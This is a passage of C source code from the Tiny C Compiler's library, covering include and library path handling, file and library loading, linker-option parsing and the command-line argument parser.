        tcc_add_sysinclude_path(s, CONFIG_TCC_SYSINCLUDEPATHS);
    }

#ifdef CONFIG_TCC_BCHECK
    if (s->do_bounds_check) {
        /* if bound checking, then add corresponding sections */
        tccelf_bounds_new(s);
        /* define symbol */
        tcc_define_symbol(s, "__BOUNDS_CHECKING_ON", NULL);
    }
#endif
    if (s->do_debug) {
        /* add debug sections */
        tccelf_stab_new(s);
    }

    tcc_add_library_path(s, CONFIG_TCC_LIBPATHS);

#ifdef TCC_TARGET_PE
# ifdef _WIN32
    if (!s->nostdlib && output_type != TCC_OUTPUT_OBJ)
        tcc_add_systemdir(s);
# endif
#else
    /* paths for crt objects */
    tcc_split_path(s, &s->crt_paths, &s->nb_crt_paths, CONFIG_TCC_CRTPREFIX);
    /* add libc crt1/crti objects */
    if ((output_type == TCC_OUTPUT_EXE || output_type == TCC_OUTPUT_DLL) &&
        !s->nostdlib) {
        if (output_type != TCC_OUTPUT_DLL)
            tcc_add_crt(s, "crt1.o");
        tcc_add_crt(s, "crti.o");
    }
#endif
    return 0;
}

LIBTCCAPI int tcc_add_include_path(TCCState *s, const char *pathname)
{
    tcc_split_path(s, &s->include_paths, &s->nb_include_paths, pathname);
    return 0;
}

LIBTCCAPI int tcc_add_sysinclude_path(TCCState *s, const char *pathname)
{
    tcc_split_path(s, &s->sysinclude_paths, &s->nb_sysinclude_paths, pathname);
    return 0;
}

ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int flags)
{
    int ret;

    /* open the file */
    ret = tcc_open(s1, filename);
    if (ret < 0) {
        if (flags & AFF_PRINT_ERROR)
            tcc_error_noabort("file '%s' not found", filename);
        return ret;
    }

    /* update target deps */
    dynarray_add(&s1->target_deps, &s1->nb_target_deps,
            tcc_strdup(filename));

    if (flags & AFF_TYPE_BIN) {
        ElfW(Ehdr) ehdr;
        int fd, obj_type;

        fd = file->fd;
        obj_type = tcc_object_type(fd, &ehdr);
        lseek(fd, 0, SEEK_SET);

#ifdef TCC_TARGET_MACHO
        if (0 == obj_type && 0 == strcmp(tcc_fileextension(filename), ".dylib"))
            obj_type = AFF_BINTYPE_DYN;
#endif

        switch (obj_type) {
        case AFF_BINTYPE_REL:
            ret = tcc_load_object_file(s1, fd, 0);
            break;
#ifndef TCC_TARGET_PE
        case AFF_BINTYPE_DYN:
            if (s1->output_type == TCC_OUTPUT_MEMORY) {
                ret = 0;
#ifdef TCC_IS_NATIVE
                if (NULL == dlopen(filename, RTLD_GLOBAL | RTLD_LAZY))
                    ret = -1;
#endif
            } else {
                ret = tcc_load_dll(s1, fd, filename,
                                   (flags & AFF_REFERENCED_DLL) != 0);
            }
            break;
#endif
        case AFF_BINTYPE_AR:
            ret = tcc_load_archive(s1, fd, !(flags & AFF_WHOLE_ARCHIVE));
            break;
#ifdef TCC_TARGET_COFF
        case AFF_BINTYPE_C67:
            ret = tcc_load_coff(s1, fd);
            break;
#endif
        default:
#ifdef TCC_TARGET_PE
            ret = pe_load_file(s1, filename, fd);
#else
            /* as GNU ld, consider it is an ld script if not recognized */
            ret = tcc_load_ldscript(s1);
#endif
            if (ret < 0)
                tcc_error_noabort("unrecognized file type");
            break;
        }
    } else {
        ret = tcc_compile(s1, flags);
    }
    tcc_close();
    return ret;
}

LIBTCCAPI int tcc_add_file(TCCState *s, const char *filename)
{
    int filetype = s->filetype;
    if (0 == (filetype & AFF_TYPE_MASK)) {
        /* use a file extension to detect a filetype */
        const char *ext = tcc_fileextension(filename);
        if (ext[0]) {
            ext++;
            if (!strcmp(ext, "S"))
                filetype = AFF_TYPE_ASMPP;
            else if (!strcmp(ext, "s"))
                filetype = AFF_TYPE_ASM;
            else if (!PATHCMP(ext, "c") || !PATHCMP(ext, "i"))
                filetype = AFF_TYPE_C;
            else
                filetype |= AFF_TYPE_BIN;
        } else {
            filetype = AFF_TYPE_C;
        }
    }
    return tcc_add_file_internal(s, filename, filetype | AFF_PRINT_ERROR);
}

LIBTCCAPI int tcc_add_library_path(TCCState *s, const char *pathname)
{
    tcc_split_path(s, &s->library_paths, &s->nb_library_paths, pathname);
    return 0;
}

static int tcc_add_library_internal(TCCState *s, const char *fmt,
    const char *filename, int flags, char **paths, int nb_paths)
{
    char buf[1024];
    int i;

    for(i = 0; i < nb_paths; i++) {
        snprintf(buf, sizeof(buf), fmt, paths[i], filename);
        if (tcc_add_file_internal(s, buf, flags | AFF_TYPE_BIN) == 0)
            return 0;
    }
    return -1;
}

/* find and load a dll. Return non zero if not found */
/* XXX: add '-rpath' option support ? */
ST_FUNC int tcc_add_dll(TCCState *s, const char *filename, int flags)
{
    return tcc_add_library_internal(s, "%s/%s", filename, flags,
        s->library_paths, s->nb_library_paths);
}

ST_FUNC int tcc_add_crt(TCCState *s, const char *filename)
{
    if (-1 == tcc_add_library_internal(s, "%s/%s",
        filename, 0, s->crt_paths, s->nb_crt_paths))
        tcc_error_noabort("file '%s' not found", filename);
    return 0;
}

/* the library name is the same as the argument of the '-l' option */
LIBTCCAPI int tcc_add_library(TCCState *s, const char *libraryname)
{
#if defined TCC_TARGET_PE
    const char *libs[] = { "%s/%s.def", "%s/lib%s.def", "%s/%s.dll", "%s/lib%s.dll", "%s/lib%s.a", NULL };
    const char **pp = s->static_link ? libs + 4 : libs;
#elif defined TCC_TARGET_MACHO
    const char *libs[] = { "%s/lib%s.dylib", "%s/lib%s.a", NULL };
    const char **pp = s->static_link ? libs + 1 : libs;
#else
    const char *libs[] = { "%s/lib%s.so", "%s/lib%s.a", NULL };
    const char **pp = s->static_link ? libs + 1 : libs;
#endif
    int flags = s->filetype & AFF_WHOLE_ARCHIVE;
    while (*pp) {
        if (0 == tcc_add_library_internal(s, *pp,
            libraryname, flags, s->library_paths, s->nb_library_paths))
            return 0;
        ++pp;
    }
    return -1;
}

PUB_FUNC int tcc_add_library_err(TCCState *s, const char *libname)
{
    int ret = tcc_add_library(s, libname);
    if (ret < 0)
        tcc_error_noabort("library '%s' not found", libname);
    return ret;
}

/* handle #pragma comment(lib,) */
ST_FUNC void tcc_add_pragma_libs(TCCState *s1)
{
    int i;
    for (i = 0; i < s1->nb_pragma_libs; i++)
        tcc_add_library_err(s1, s1->pragma_libs[i]);
}

LIBTCCAPI int tcc_add_symbol(TCCState *s, const char *name, const void *val)
{
#ifdef TCC_TARGET_PE
    /* On x86_64 'val' might not be reachable with a 32bit offset.
       So it is handled here as if it were in a DLL. */
    pe_putimport(s, 0, name, (uintptr_t)val);
#else
    set_elf_sym(symtab_section, (uintptr_t)val, 0,
        ELFW(ST_INFO)(STB_GLOBAL, STT_NOTYPE), 0,
        SHN_ABS, name);
#endif
    return 0;
}

LIBTCCAPI void tcc_set_lib_path(TCCState *s, const char *path)
{
    tcc_free(s->tcc_lib_path);
    s->tcc_lib_path = tcc_strdup(path);
}

#define WD_ALL    0x0001 /* warning is activated when using -Wall */
#define FD_INVERT 0x0002 /* invert value before storing */

typedef struct FlagDef {
    uint16_t offset;
    uint16_t flags;
    const char *name;
} FlagDef;

static int no_flag(const char **pp)
{
    const char *p = *pp;
    if (*p != 'n' || *++p != 'o' || *++p != '-')
        return 0;
    *pp = p + 1;
    return 1;
}

ST_FUNC int set_flag(TCCState *s, const FlagDef *flags, const char *name)
{
    int value, ret;
    const FlagDef *p;
    const char *r;

    value = 1;
    r = name;
    if (no_flag(&r))
        value = 0;

    for (ret = -1, p = flags; p->name; ++p) {
        if (ret) {
            if (strcmp(r, p->name))
                continue;
        } else {
            if (0 == (p->flags & WD_ALL))
                continue;
        }
        if (p->offset) {
            *(int*)((char *)s + p->offset) =
                p->flags & FD_INVERT ? !value : value;
            if (ret)
                return 0;
        } else {
            ret = 0;
        }
    }
    return ret;
}

static int strstart(const char *val, const char **str)
{
    const char *p, *q;
    p = *str;
    q = val;
    while (*q) {
        if (*p != *q)
            return 0;
        p++;
        q++;
    }
    *str = p;
    return 1;
}

/* Like strstart, but automatically takes into account that ld options can
 *
 * - start with double or single dash (e.g. '--soname' or '-soname')
 * - arguments can be given as separate or after '=' (e.g. '-Wl,-soname,x.so'
 *   or '-Wl,-soname=x.so')
 *
 * you provide `val` always in 'option[=]' form (no leading -)
 */
static int link_option(const char *str, const char *val, const char **ptr)
{
    const char *p, *q;
    int ret;

    /* there should be 1 or 2 dashes */
    if (*str++ != '-')
        return 0;
    if (*str == '-')
        str++;

    /* then str & val should match (potentially up to '=') */
    p = str;
    q = val;

    ret = 1;
    if (q[0] == '?') {
        ++q;
        if (no_flag(&p))
            ret = -1;
    }

    while (*q != '\0' && *q != '=') {
        if (*p != *q)
            return 0;
        p++;
        q++;
    }

    /* '=' near eos means ',' or '=' is ok */
    if (*q == '=') {
        if (*p == 0)
            *ptr = p;
        if (*p != ',' && *p != '=')
            return 0;
        p++;
    } else if (*p) {
        return 0;
    }
    *ptr = p;
    return ret;
}

static const char *skip_linker_arg(const char **str)
{
    const char *s1 = *str;
    const char *s2 = strchr(s1, ',');
    *str = s2 ? s2++ : (s2 = s1 + strlen(s1));
    return s2;
}

static void copy_linker_arg(char **pp, const char *s, int sep)
{
    const char *q = s;
    char *p = *pp;
    int l = 0;
    if (p && sep)
        p[l = strlen(p)] = sep, ++l;
    skip_linker_arg(&q);
    pstrncpy(l + (*pp = tcc_realloc(p, q - s + l + 1)), s, q - s);
}

/* set linker options */
static int tcc_set_linker(TCCState *s, const char *option)
{
    while (*option) {

        const char *p = NULL;
        char *end = NULL;
        int ignoring = 0;
        int ret;

        if (link_option(option, "Bsymbolic", &p)) {
            s->symbolic = 1;
        } else if (link_option(option, "nostdlib", &p)) {
            s->nostdlib = 1;
        } else if (link_option(option, "fini=", &p)) {
            copy_linker_arg(&s->fini_symbol, p, 0);
            ignoring = 1;
        } else if (link_option(option, "image-base=", &p)
                || link_option(option, "Ttext=", &p)) {
            s->text_addr = strtoull(p, &end, 16);
            s->has_text_addr = 1;
        } else if (link_option(option, "init=", &p)) {
            copy_linker_arg(&s->init_symbol, p, 0);
            ignoring = 1;
        } else if (link_option(option, "oformat=", &p)) {
#if defined(TCC_TARGET_PE)
            if (strstart("pe-", &p)) {
#elif PTR_SIZE == 8
            if (strstart("elf64-", &p)) {
#else
            if (strstart("elf32-", &p)) {
#endif
                s->output_format = TCC_OUTPUT_FORMAT_ELF;
            } else if (!strcmp(p, "binary")) {
                s->output_format = TCC_OUTPUT_FORMAT_BINARY;
#ifdef TCC_TARGET_COFF
            } else if (!strcmp(p, "coff")) {
                s->output_format = TCC_OUTPUT_FORMAT_COFF;
#endif
            } else
                goto err;

        } else if (link_option(option, "as-needed", &p)) {
            ignoring = 1;
        } else if (link_option(option, "O", &p)) {
            ignoring = 1;
        } else if (link_option(option, "export-all-symbols", &p)) {
            s->rdynamic = 1;
        } else if (link_option(option, "export-dynamic", &p)) {
            s->rdynamic = 1;
        } else if (link_option(option, "rpath=", &p)) {
            copy_linker_arg(&s->rpath, p, ':');
        } else if (link_option(option, "enable-new-dtags", &p)) {
            s->enable_new_dtags = 1;
        } else if (link_option(option, "section-alignment=", &p)) {
            s->section_align = strtoul(p, &end, 16);
        } else if (link_option(option, "soname=", &p)) {
            copy_linker_arg(&s->soname, p, 0);
#ifdef TCC_TARGET_PE
        } else if (link_option(option, "large-address-aware", &p)) {
            s->pe_characteristics |= 0x20;
        } else if (link_option(option, "file-alignment=", &p)) {
            s->pe_file_align = strtoul(p, &end, 16);
        } else if (link_option(option, "stack=", &p)) {
            s->pe_stack_size = strtoul(p, &end, 10);
        } else if (link_option(option, "subsystem=", &p)) {
#if defined(TCC_TARGET_I386) || defined(TCC_TARGET_X86_64)
            if (!strcmp(p, "native")) {
                s->pe_subsystem = 1;
            } else if (!strcmp(p, "console")) {
                s->pe_subsystem = 3;
            } else if (!strcmp(p, "gui") || !strcmp(p, "windows")) {
                s->pe_subsystem = 2;
            } else if (!strcmp(p, "posix")) {
                s->pe_subsystem = 7;
            } else if (!strcmp(p, "efiapp")) {
                s->pe_subsystem = 10;
            } else if (!strcmp(p, "efiboot")) {
                s->pe_subsystem = 11;
            } else if (!strcmp(p, "efiruntime")) {
                s->pe_subsystem = 12;
            } else if (!strcmp(p, "efirom")) {
                s->pe_subsystem = 13;
#elif defined(TCC_TARGET_ARM)
            if (!strcmp(p, "wince")) {
                s->pe_subsystem = 9;
#endif
            } else
                goto err;
#endif
        } else if (ret = link_option(option, "?whole-archive", &p), ret) {
            if (ret > 0)
                s->filetype |= AFF_WHOLE_ARCHIVE;
            else
                s->filetype &= ~AFF_WHOLE_ARCHIVE;
        } else if (p) {
            return 0;
        } else {
    err:
            tcc_error("unsupported linker option '%s'", option);
        }

        if (ignoring && s->warn_unsupported)
            tcc_warning("unsupported linker option '%s'", option);

        option = skip_linker_arg(&p);
    }
    return 1;
}

typedef struct TCCOption {
    const char *name;
    uint16_t index;
    uint16_t flags;
} TCCOption;

enum {
    TCC_OPTION_HELP,
    TCC_OPTION_HELP2,
    TCC_OPTION_v,
    TCC_OPTION_I,
    TCC_OPTION_D,
    TCC_OPTION_U,
    TCC_OPTION_P,
    TCC_OPTION_L,
    TCC_OPTION_B,
    TCC_OPTION_l,
    TCC_OPTION_bench,
    TCC_OPTION_bt,
    TCC_OPTION_b,
    TCC_OPTION_g,
    TCC_OPTION_c,
    TCC_OPTION_dumpversion,
    TCC_OPTION_d,
    TCC_OPTION_static,
    TCC_OPTION_std,
    TCC_OPTION_shared,
    TCC_OPTION_soname,
    TCC_OPTION_o,
    TCC_OPTION_r,
    TCC_OPTION_s,
    TCC_OPTION_traditional,
    TCC_OPTION_Wl,
    TCC_OPTION_Wp,
    TCC_OPTION_W,
    TCC_OPTION_O,
    TCC_OPTION_mfloat_abi,
    TCC_OPTION_m,
    TCC_OPTION_f,
    TCC_OPTION_isystem,
    TCC_OPTION_iwithprefix,
    TCC_OPTION_include,
    TCC_OPTION_nostdinc,
    TCC_OPTION_nostdlib,
    TCC_OPTION_print_search_dirs,
    TCC_OPTION_rdynamic,
    TCC_OPTION_param,
    TCC_OPTION_pedantic,
    TCC_OPTION_pthread,
    TCC_OPTION_run,
    TCC_OPTION_w,
    TCC_OPTION_pipe,
    TCC_OPTION_E,
    TCC_OPTION_MD,
    TCC_OPTION_MF,
    TCC_OPTION_x,
    TCC_OPTION_ar,
    TCC_OPTION_impdef
};

#define TCC_OPTION_HAS_ARG 0x0001
#define TCC_OPTION_NOSEP   0x0002 /* cannot have space before option and arg */

static const TCCOption tcc_options[] = {
    { "h", TCC_OPTION_HELP, 0 },
    { "-help", TCC_OPTION_HELP, 0 },
    { "?", TCC_OPTION_HELP, 0 },
    { "hh", TCC_OPTION_HELP2, 0 },
    { "v", TCC_OPTION_v, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },
    { "I", TCC_OPTION_I, TCC_OPTION_HAS_ARG },
    { "D", TCC_OPTION_D, TCC_OPTION_HAS_ARG },
    { "U", TCC_OPTION_U, TCC_OPTION_HAS_ARG },
    { "P", TCC_OPTION_P, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },
    { "L", TCC_OPTION_L, TCC_OPTION_HAS_ARG },
    { "B", TCC_OPTION_B, TCC_OPTION_HAS_ARG },
    { "l", TCC_OPTION_l, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },
    { "bench", TCC_OPTION_bench, 0 },
#ifdef CONFIG_TCC_BACKTRACE
    { "bt", TCC_OPTION_bt, TCC_OPTION_HAS_ARG },
#endif
#ifdef CONFIG_TCC_BCHECK
    { "b", TCC_OPTION_b, 0 },
#endif
    { "g", TCC_OPTION_g, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },
    { "c", TCC_OPTION_c, 0 },
    { "dumpversion", TCC_OPTION_dumpversion, 0},
    { "d", TCC_OPTION_d, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },
    { "static", TCC_OPTION_static, 0 },
    { "std", TCC_OPTION_std, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },
    { "shared", TCC_OPTION_shared, 0 },
    { "soname", TCC_OPTION_soname, TCC_OPTION_HAS_ARG },
    { "o", TCC_OPTION_o, TCC_OPTION_HAS_ARG },
    { "-param", TCC_OPTION_param, TCC_OPTION_HAS_ARG },
    { "pedantic", TCC_OPTION_pedantic, 0},
    { "pthread", TCC_OPTION_pthread, 0},
    { "run", TCC_OPTION_run, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },
    { "rdynamic", TCC_OPTION_rdynamic, 0 },
    { "r", TCC_OPTION_r, 0 },
    { "s", TCC_OPTION_s, 0 },
    { "traditional", TCC_OPTION_traditional, 0 },
    { "Wl,", TCC_OPTION_Wl, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },
    { "Wp,", TCC_OPTION_Wp, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },
    { "W", TCC_OPTION_W, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },
    { "O", TCC_OPTION_O, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },
#ifdef TCC_TARGET_ARM
    { "mfloat-abi", TCC_OPTION_mfloat_abi, TCC_OPTION_HAS_ARG },
#endif
    { "m", TCC_OPTION_m, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },
    { "f", TCC_OPTION_f, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },
    { "isystem", TCC_OPTION_isystem, TCC_OPTION_HAS_ARG },
    { "include", TCC_OPTION_include, TCC_OPTION_HAS_ARG },
    { "nostdinc", TCC_OPTION_nostdinc, 0 },
    { "nostdlib", TCC_OPTION_nostdlib, 0 },
    { "print-search-dirs", TCC_OPTION_print_search_dirs, 0 },
    { "w", TCC_OPTION_w, 0 },
    { "pipe", TCC_OPTION_pipe, 0},
    { "E", TCC_OPTION_E, 0},
    { "MD", TCC_OPTION_MD, 0},
    { "MF", TCC_OPTION_MF, TCC_OPTION_HAS_ARG },
    { "x", TCC_OPTION_x, TCC_OPTION_HAS_ARG },
    { "ar", TCC_OPTION_ar, 0},
#ifdef TCC_TARGET_PE
    { "impdef", TCC_OPTION_impdef, 0},
#endif
    { NULL, 0, 0 },
};

static const FlagDef options_W[] = {
    { 0, 0, "all" },
    { offsetof(TCCState, warn_unsupported), 0, "unsupported" },
    { offsetof(TCCState, warn_write_strings), 0, "write-strings" },
    { offsetof(TCCState, warn_error), 0, "error" },
    { offsetof(TCCState, warn_gcc_compat), 0, "gcc-compat" },
    { offsetof(TCCState, warn_implicit_function_declaration), WD_ALL,
      "implicit-function-declaration" },
    { 0, 0, NULL }
};

static const FlagDef options_f[] = {
    { offsetof(TCCState, char_is_unsigned), 0, "unsigned-char" },
    { offsetof(TCCState, char_is_unsigned), FD_INVERT, "signed-char" },
    { offsetof(TCCState, nocommon), FD_INVERT, "common" },
    { offsetof(TCCState, leading_underscore), 0, "leading-underscore" },
    { offsetof(TCCState, ms_extensions), 0, "ms-extensions" },
    { offsetof(TCCState, dollars_in_identifiers), 0, "dollars-in-identifiers" },
    { 0, 0, NULL }
};

static const FlagDef options_m[] = {
    { offsetof(TCCState, ms_bitfields), 0, "ms-bitfields" },
#ifdef TCC_TARGET_X86_64
    { offsetof(TCCState, nosse), FD_INVERT, "sse" },
#endif
    { 0, 0, NULL }
};

static void parse_option_D(TCCState *s1, const char *optarg)
{
    char *sym = tcc_strdup(optarg);
    char *value = strchr(sym, '=');
    if (value)
        *value++ = '\0';
    tcc_define_symbol(s1, sym, value);
    tcc_free(sym);
}

static void args_parser_add_file(TCCState *s, const char* filename, int filetype)
{
    struct filespec *f = tcc_malloc(sizeof *f + strlen(filename));
    f->type = filetype;
    strcpy(f->name, filename);
    dynarray_add(&s->files, &s->nb_files, f);
}

static int args_parser_make_argv(const char *r, int *argc, char ***argv)
{
    int ret = 0, q, c;
    CString str;
    for(;;) {
        while (c = (unsigned char)*r, c && c <= ' ')
	    ++r;
        if (c == 0)
            break;
        q = 0;
        cstr_new(&str);
        while (c = (unsigned char)*r, c) {
            ++r;
            if (c == '\\' && (*r == '"' || *r == '\\')) {
                c = *r++;
            } else if (c == '"') {
                q = !q;
                continue;
            } else if (q == 0 && c <= ' ') {
                break;
            }
            cstr_ccat(&str, c);
        }
        cstr_ccat(&str, 0);
        //printf("<%s>\n", str.data), fflush(stdout);
        dynarray_add(argv, argc, tcc_strdup(str.data));
        cstr_free(&str);
        ++ret;
    }
    return ret;
}

/* read list file */
static void args_parser_listfile(TCCState *s,
    const char *filename, int optind, int *pargc, char ***pargv)
{
    int fd, i;
    size_t len;
    char *p;
    int argc = 0;
    char **argv = NULL;

    fd = open(filename, O_RDONLY | O_BINARY);
    if (fd < 0)
        tcc_error("listfile '%s' not found", filename);

    len = lseek(fd, 0, SEEK_END);
    p = tcc_malloc(len + 1), p[len] = 0;
    lseek(fd, 0, SEEK_SET), read(fd, p, len), close(fd);

    for (i = 0; i < *pargc; ++i)
        if (i == optind)
            args_parser_make_argv(p, &argc, &argv);
        else
            dynarray_add(&argv, &argc, tcc_strdup((*pargv)[i]));

    tcc_free(p);
    dynarray_reset(&s->argv, &s->argc);
    *pargc = s->argc = argc, *pargv = s->argv = argv;
}

PUB_FUNC int tcc_parse_args(TCCState *s, int *pargc, char ***pargv, int optind)
{
    const TCCOption *popt;
    const char *optarg, *r;
    const char *run = NULL;
    int last_o = -1;
    int x;
    CString linker_arg; /* collect -Wl options */
    int tool = 0, arg_start = 0, noaction = optind;
    char **argv = *pargv;
    int argc = *pargc;

    cstr_new(&linker_arg);

    while (optind < argc) {
        r = argv[optind];
        if (r[0] == '@' && r[1] != '\0') {
            args_parser_listfile(s, r + 1, optind, &argc, &argv);
	    continue;
        }
        optind++;
        if (tool) {
            if (r[0] == '-' && r[1] == 'v' && r[2] == 0)
                ++s->verbose;
            continue;
        }
reparse:
        if (r[0] != '-' || r[1] == '\0') {
            if (r[0] != '@') /* allow "tcc file(s) -run @ args ..." */
                args_parser_add_file(s, r, s->filetype);
            if (run) {
                tcc_set_options(s, run);
                arg_start = optind - 1;
                break;
            }
            continue;
        }

        /* find option in table */
        for(popt = tcc_options; ; ++popt) {
            const char *p1 = popt->name;
            const char *r1 = r + 1;
            if (p1 == NULL)
                tcc_error("invalid option -- '%s'", r);
            if (!strstart(p1, &r1))
                continue;
            optarg = r1;
            if (popt->flags & TCC_OPTION_HAS_ARG) {
                if (*r1 == '\0' && !(popt->flags & TCC_OPTION_NOSEP)) {
                    if (optind >= argc)
                arg_err:
                        tcc_error("argument to '%s' is missing", r);
                    optarg = argv[optind++];
                }
            } else if (*r1 != '\0')
                continue;
            break;
        }

        switch(popt->index) {
        case TCC_OPTION_HELP:
            return OPT_HELP;
        case TCC_OPTION_HELP2:
            return OPT_HELP2;
        case TCC_OPTION_I:
            tcc_add_include_path(s, optarg);
            break;
        case TCC_OPTION_D:
            parse_option_D(s, optarg);
            break;
        case TCC_OPTION_U:
            tcc_undefine_symbol(s, optarg);
            break;
        case TCC_OPTION_L:
            tcc_add_library_path(s, optarg);
            break;
        case TCC_OPTION_B:
            /* set tcc utilities path (mainly for tcc development) */
            tcc_set_lib_path(s, optarg);
            break;
        case TCC_OPTION_l:
            args_parser_add_file(s, optarg, AFF_TYPE_LIB | (s->filetype & ~AFF_TYPE_MASK));
            s->nb_libraries++;
            break;
        case TCC_OPTION_pthread:
            parse_option_D(s, "_REENTRANT");
            s->option_pthread = 1;
            break;
        case TCC_OPTION_bench:
            s->do_bench = 1;
            break;
#ifdef CONFIG_TCC_BACKTRACE
        case TCC_OPTION_bt:
            tcc_set_num_callers(atoi(optarg));
            break;
#endif
#ifdef CONFIG_TCC_BCHECK
        case TCC_OPTION_b:
            s->do_bounds_check = 1;
            s->do_debug = 1;
            break;
#endif
        case TCC_OPTION_g:
            s->do_debug = 1;
            break;
        case TCC_OPTION_c:
            x = TCC_OUTPUT_OBJ;
        set_output_type:
            if (s->output_type)
                tcc_warning("-%s: overriding compiler action already specified", popt->name);
            s->output_type = x;
            break;
        case TCC_OPTION_d:
            if (*optarg == 'D')
                s->dflag = 3;
            else if (*optarg == 'M')
                s->dflag = 7;
            else if (*optarg == 't')
                s->dflag = 16;
            else if (isnum(*optarg))
                g_debug = atoi(optarg);
            else
                goto unsupported_option;
            break;
        case TCC_OPTION_static:
            s->static_link = 1;
            break;
        case TCC_OPTION_std:
    	    /* silently ignore, a current purpose:
    	       allow to use a tcc as a reference compiler for "make test" */
            break;
        case TCC_OPTION_shared:
            x = TCC_OUTPUT_DLL;
            goto set_output_type;
        case TCC_OPTION_soname:
            s->soname = tcc_strdup(optarg);
            break;
        case TCC_OPTION_o:
            if (s->outfile) {
                tcc_warning("multiple -o option");
                tcc_free(s->outfile);
            }
            s->outfile = tcc_strdup(optarg);
            break;
        case TCC_OPTION_r:
            /* generate a .o merging several output files */
            s->option_r = 1;
            x = TCC_OUTPUT_OBJ;
            goto set_output_type;
        case TCC_OPTION_isystem:
            tcc_add_sysinclude_path(s, optarg);
            break;
	case TCC_OPTION_include:
	    dynarray_add(&s->cmd_include_files,
			 &s->nb_cmd_include_files, tcc_strdup(optarg));
	    break;
        case TCC_OPTION_nostdinc:
            s->nostdinc = 1;
            break;
        case TCC_OPTION_nostdlib:
            s->nostdlib = 1;
            break;
        case TCC_OPTION_run:
#ifndef TCC_IS_NATIVE
            tcc_error("-run is not available in a cross compiler");
#endif
            run = optarg;
            x = TCC_OUTPUT_MEMORY;
            goto set_output_type;
        case TCC_OPTION_v:
            do ++s->verbose; while (*optarg++ == 'v');
            ++noaction;
            break;
        case TCC_OPTION_f:
            if (set_flag(s, options_f, optarg) < 0)
                goto unsupported_option;
            break;
#ifdef TCC_TARGET_ARM
        case TCC_OPTION_mfloat_abi:
            /* tcc doesn't support soft float yet */
            if (!strcmp(optarg, "softfp")) {
                s->float_abi = ARM_SOFTFP_FLOAT;
                tcc_undefine_symbol(s, "__ARM_PCS_VFP");
            } else if (!strcmp(optarg, "hard"))
                s->float_abi = ARM_HARD_FLOAT;
            else
                tcc_error("unsupported float abi '%s'", optarg);
            break;
#endif
        case TCC_OPTION_m:
            if (set_flag(s, options_m, optarg) < 0) {
                if (x = atoi(optarg), x != 32 && x != 64)
                    goto unsupported_option;
                if (PTR_SIZE != x/8)
                    return x;
                ++noaction;
            }
            break;
        case TCC_OPTION_W:
            if (set_flag(s, options_W, optarg) < 0)
                goto unsupported_option;
            break;
        case TCC_OPTION_w:
            s->warn_none = 1;
            break;
        case TCC_OPTION_rdynamic:
            s->rdynamic = 1;
            break;
        case TCC_OPTION_Wl:
            if (linker_arg.size)
                --linker_arg.size, cstr_ccat(&linker_arg, ',');
            cstr_cat(&linker_arg, optarg, 0);
            if (tcc_set_linker(s, linker_arg.data))
                cstr_free(&linker_arg);
            break;
	case TCC_OPTION_Wp:
	    r = optarg;
	    goto reparse;
        case TCC_OPTION_E:
            x = TCC_OUTPUT_PREPROCESS;
            goto set_output_type;
        case TCC_OPTION_P:
            s->Pflag = atoi(optarg) + 1;
            break;
        case TCC_OPTION_MD:
            s->gen_deps = 1;
            break;
        case TCC_OPTION_MF:
            s->deps_outfile = tcc_strdup(optarg);
            break;
        case TCC_OPTION_dumpversion:
            printf ("%s\n", TCC_VERSION);
            exit(0);
            break;
        case TCC_OPTION_x:
            x = 0;
            if (*optarg == 'c')
                x = AFF_TYPE_C;
            else if (*optarg == 'a')
                x = AFF_TYPE_ASMPP;
            else if (*optarg == 'b')
                x = AFF_TYPE_BIN;
            else if (*optarg == 'n')
                x = AFF_TYPE_NONE;
            else
                tcc_warning("unsupported language '%s'", optarg);
            s->filetype = x | (s->filetype & ~AFF_TYPE_MASK);
            break;
        case TCC_OPTION_O:
            last_o = atoi(optarg);
            break;
        case TCC_OPTION_print_search_dirs:
            x = OPT_PRINT_DIRS;
            goto extra_action;
        case TCC_OPTION_impdef:
            x = OPT_IMPDEF;
            goto extra_action;
        case TCC_OPTION_ar:
            x = OPT_AR;
        extra_action:
            arg_start = optind - 1;
            if (arg_start != noaction)
                tcc_error("cannot parse %s here", r);
            tool = x;
            break;
        case TCC_OPTION_traditional:
        case TCC_OPTION_pedantic:
        case TCC_OPTION_pipe:
        case TCC_OPTION_s:
            /* ignored */
            break;
        default:
unsupported_option:
            if (s->warn_unsupported)
                tcc_warning("unsupported option '%s'", r);
            break;
        }
    }
    if (last_o > 0)
        tcc_define_symbol(s, "__OPTIMIZE__", NULL);
    if (linker_arg.size) {
        r = linker_arg.data;
        goto arg_err;
    }
    *pargc = argc - arg_start;
    *pargv = argv + arg_start;
    if (tool)
        return tool;
    if (optind != noaction)
        return 0;
    if (s->verbose == 2)
        return OPT_PRINT_DIRS;
    if (s->verbose)
        return OPT_V;
    return OPT_HELP;
}

LIBTCCAPI void tcc_set_options(TCCState *s, const char *r)
{
    char **argv = NULL;
    int argc = 0;
    args_parser_make_argv(r, &argc, &argv);
    tcc_parse_args(s, &argc, &argv, 0);
    dynarray_reset(&argv, &argc);
}

PUB_FUNC void tcc_print_stats(TCCState *s, unsigned total_time)
{
    if (total_time < 1)
        total_time = 1;
    if (total_bytes < 1)
        total_bytes = 1;
    fprintf(stderr, "* %d idents, %d lines, %d bytes\n"
                    "* %0.3f s, %u lines/s, %0.1f MB/s\n",
           tok_ident - TOK_IDENT, total_lines, total_bytes,
           (double)total_time/1000,
           (unsigned)total_lines*1000/total_time,
           (double)total_bytes/1000/total_time);
#ifdef MEM_DEBUG
    fprintf(stderr, "* %d bytes memory used\n", mem_max_size);
#endif
}
